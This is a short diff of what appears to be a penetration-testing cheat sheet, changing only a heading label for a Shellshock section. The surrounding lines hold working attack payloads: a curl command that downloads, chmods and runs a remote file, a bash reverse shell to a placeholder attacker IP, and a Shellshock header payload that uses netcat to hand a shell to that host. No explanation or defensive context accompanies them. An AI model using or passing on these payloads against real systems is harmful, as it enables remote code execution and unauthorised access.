@@ -10,7 +10,7 @@ curl -k http://ip:port/file -o file; chmod 777 file; bash file.sh
 
 bash -i >& /dev/tcp/<your_ip>/<port> 0>&1
 
-# shellshock (ptl)
+# shellshock
 
 () { :;}; /usr/bin/nc <your_ip> <port> -e /bin/bash
 
